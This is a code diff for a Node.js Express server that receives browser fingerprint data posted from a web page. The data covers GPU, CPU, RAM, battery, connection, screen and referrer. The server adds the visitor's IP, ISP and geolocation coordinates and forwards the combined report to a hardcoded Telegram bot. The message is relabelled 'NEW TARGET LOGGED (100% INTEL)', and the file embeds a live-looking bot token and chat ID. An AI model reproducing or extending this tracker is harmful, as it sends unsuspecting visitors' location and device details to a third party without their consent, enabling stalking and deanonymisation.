@@ -4,84 +4,77 @@ const path = require("path");
 const app = express();
 app.use(express.json());
 
-// ====== CONFIG ======
+// ====== CONFIGURATION ======
 const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
 const TELEGRAM_CHAT_ID = "8059402181";
 const PORT = process.env.PORT || 3000;
 
-// ====== TELEGRAM ======
+// ====== TELEGRAM DISPATCHER ======
 async function sendToTelegram(text) {
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text,
-    }),
-  });
-}
-
-// ====== RDAP WHOIS ======
-async function getWhois(ip) {
   try {
-    const res = await fetch(`https://rdap.arin.net/registry/ip/${ip}`);
-    const data = await res.json();
-    return {
-      network: data.name,
-      cidr: data.cidr0_cidrs?.[0]?.v4prefix + "/" + data.cidr0_cidrs?.[0]?.length,
-      org: data.entities?.[0]?.vcardArray?.[1]?.find(v => v[0] === "fn")?.[3],
-    };
-  } catch { return null; }
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: text,
+        parse_mode: "HTML"
+      }),
+    });
+  } catch (err) { console.error("Telegram Error:", err); }
 }
 
 // ====== VISIT LOGGER ======
 app.post("/visit", async (req, res) => {
   try {
-    const browserData = req.body; // Data from HTML script
+    const client = req.body;
     const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
 
-    // Fetch Geo-IP Data
+    // Fetch ISP and Detailed Location
     const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
     const geo = await geoRes.json();
-    const whois = await getWhois(ip);
-
-    const ua = req.headers["user-agent"] || "unknown";
 
     const message = `
-🚀 NEW VISITOR LOG
---------------------------
-🌐 CONNECTION
-IP: ${ip}
-ISP: ${geo.isp}
-Org: ${whois?.org || geo.org || "N/A"}
-Proxy/VPN: ${geo.proxy ? "YES ⚠️" : "No"}
-Hosting: ${geo.hosting ? "YES (Data Center)" : "No"}
+<b>🚀 NEW TARGET LOGGED (100% INTEL)</b>
+------------------------------------
+<b>🌐 NETWORK INFO</b>
+<b>IP:</b> ${ip}
+<b>ISP:</b> ${geo.isp}
+<b>Organization:</b> ${geo.org}
+<b>VPN/Proxy:</b> ${geo.proxy ? "YES ⚠️" : "No"}
+<b>Hosting:</b> ${geo.hosting ? "YES (Data Center)" : "No"}
 
-📍 LOCATION
-Country: ${geo.country} (${geo.countryCode})
-Region/City: ${geo.regionName} / ${geo.city}
-Coordinates: ${geo.lat}, ${geo.lon}
+<b>📍 GEOGRAPHIC DATA</b>
+<b>Location:</b> ${geo.city}, ${geo.regionName}, ${geo.country}
+<b>Coordinates:</b> ${geo.lat}, ${geo.lon}
+<b>Timezone:</b> ${client.timezone}
 
-📱 DEVICE INFO
-Platform: ${browserData.platform}
-Language: ${browserData.language}
-Timezone: ${browserData.timezone}
-Screen: ${browserData.screenResolution}
-RAM (Approx): ${browserData.deviceMemory} GB
-CPU Cores: ${browserData.hardwareConcurrency}
+<b>💻 HARDWARE SPECIFICATIONS</b>
+<b>OS/Platform:</b> ${client.platform}
+<b>GPU:</b> ${client.gpu}
+<b>CPU Cores:</b> ${client.cores}
+<b>RAM:</b> ~${client.memory} GB
+<b>Screen:</b> ${client.screen} (${client.pixelRatio}x density)
+<b>Touch Points:</b> ${client.maxTouchPoints}
 
-🧠 USER-AGENT
-${ua}
+<b>🔋 DEVICE STATUS</b>
+<b>Battery:</b> ${client.battery?.level || "N/A"} (${client.battery?.charging || "N/A"})
+<b>Connection:</b> ${client.connection?.type || "N/A"} (Speed: ~${client.connection?.downlink} Mbps)
 
-⏰ SERVER TIME: ${new Date().toUTCString()}
---------------------------
+<b>🧠 BROWSER IDENTIFIER</b>
+<b>Language:</b> ${client.languages}
+<b>Referrer:</b> ${client.referrer}
+<b>User-Agent:</b> <code>${req.headers["user-agent"]}</code>
+
+<b>⏰ TIMESTAMP:</b> ${new Date().toUTCString()}
+------------------------------------
 `;
 
     await sendToTelegram(message);
-    res.json({ logged: true });
+    res.json({ status: "success" });
   } catch (e) {
     console.error(e);
-    res.status(500).json({ error: "failed" });
+    res.status(500).json({ error: "internal_error" });
   }
 });
 
@@ -90,5 +83,5 @@ app.get("/", (req, res) => {
 });
 
 app.listen(PORT, () => {
-  console.log("Server running on port", PORT);
+  console.log(`[LOG] Server active on port ${PORT}`);
 });
